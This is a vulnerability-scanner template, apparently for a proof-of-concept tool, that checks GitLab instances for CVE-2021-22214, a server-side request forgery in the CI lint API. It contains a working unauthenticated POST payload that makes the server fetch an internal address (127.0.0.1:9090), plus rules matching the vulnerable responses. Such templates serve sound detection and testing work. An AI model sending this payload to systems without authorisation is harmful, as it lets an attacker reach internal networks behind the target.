name: Gitlab_CI_Lint_API_SSRF__CVE_2021_22214
transport: http
set: {}
detail:
  dock: app="GitLab"
  product: GitLab
  homepage: https://about.gitlab.com/
  impact: <p>As a result, hackers can use this vulnerability as a springboard to access
    or attack the internal system<br></p>
  description: When requests to the internal network for webhooks are enabled, a server-side
    request forgery vulnerability in GitLab CE/EE affecting all versions starting
    from 10.5 was possible to exploit for an unauthenticated attacker even on a GitLab
    instance where registration is limited
rules:
  r1:
    method: POST
    path: /api/v4/ci/lint
    follow_redirects: false
    body: '{ "include_merged_yaml": true, "content": "include:\n  remote: http://127.0.0.1:9090/api/v1/targets?test.yml" }'
    headers:
      Content-Type: application/json
    expression: (response.status == 200 && response.body.bcontains(b'merged_yaml')) || (response.status==500 && response.body.bcontains(b"500 Internal Server Error"))
expression: r1()
